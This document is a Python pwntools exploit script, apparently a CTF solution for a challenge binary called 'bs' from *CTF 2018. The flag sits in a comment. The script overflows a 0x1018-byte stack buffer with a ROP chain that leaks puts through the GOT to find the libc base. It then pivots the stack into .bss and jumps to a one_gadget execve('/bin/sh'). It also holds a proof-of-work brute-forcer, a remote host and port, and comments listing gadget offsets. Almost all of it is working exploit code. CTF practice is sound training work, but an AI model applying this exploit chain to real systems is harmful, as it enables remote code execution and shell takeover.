# coding:utf-8
# *ctf{h4ve_fun_w1th_0ld_tr1ck5_in_2018}
from pwn import *
from hashlib import *
import time
import string
import sys
import itertools
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
#libc = ELF("./libc.so.6")
LOCAL = 1
if LOCAL:
    io = process('./bs',env={"LD_PRELOAD":"./libc.so.6"})
    elf = ELF('./bs')
    context.log_level = 'debug'
else:
    io = remote("47.91.226.78",10005)

def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def proof_of_work():
    io.recvuntil('sha256(xxxx+')
    
    s=string.letters+string.digits

    chal=io.recv(16)
    io.recvuntil(') == ')
    t=io.recv(64)
    print(chal)
    print(t)
    io.recvuntil('Give me xxxx:')
    for i in itertools.permutations(s,4):
        sol=''.join(i)
        if sha256(sol+chal).hexdigest()==t:
            return sol

def mmenu(bytes,data):
    io.recvuntil("How many bytes do you want to send?\n")
    io.sendline(str(bytes))
    sleep(0.1)
    io.send(data)

puts_plt = 0x4007C0
read_plt = 0x4007E0 
leave_addr = 0x400A9B

pop_rdi_addr = 0x400c03
puts_got = 0x601FB0
pop_rbp_addr = 0x400870
pop_rsi_addr = 0x400c01 #0x0000000000400c01 : pop rsi ; pop r15 ; ret

bss_addr = 0x602030

def pwnit():
	# data = proof_of_work()
	# success('data:'+data)
	# io.send(data)
#ROPgadget --binary bs --only "pop|ret"

	payload = '\x00'*0x1018+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)
	payload += p64(pop_rbp_addr) + p64(bss_addr-0x8)
	payload += p64(pop_rdi_addr) + p64(0)
	payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(bss_addr)
	payload += p64(read_plt) + p64(leave_addr)
	payload = payload.ljust(0x2000,'\x00')

	
	mmenu(0x2000,payload)

	io.recvuntil('It\'s time to say goodbye.\n')
	base = u64(io.recv(6)+'\x00\x00')-libc.symbols['puts']
	io.send(p64(base+0x4526a))

	io.interactive()
    
if __name__ == "__main__":
    pwnit()



# 0x45216   execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a   execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274   execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117   execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL





# >>> ord(asm('push ebp', arch='x86-64'))
# 85

# >>> hex(ord(asm('pop esi', arch='x86-64')))
# '0x5e'




# >>> hex(ord('P'))
# '0x50'

# >>> hex(ord(asm('push esp', arch='x86-64')))
# '0x54'

# >>> hex(ord(asm('push esp', arch='x86-64')))
# '0x54'

# >>> hex(ord(asm('pop esi', arch='x86-64')))
# '0x5e'

# >>> hex(ord(asm('pop edx', arch='x86-64')))
# '0x5a'

# >>> asm('syscall', arch='x86-64')
# '\x0f\x05'


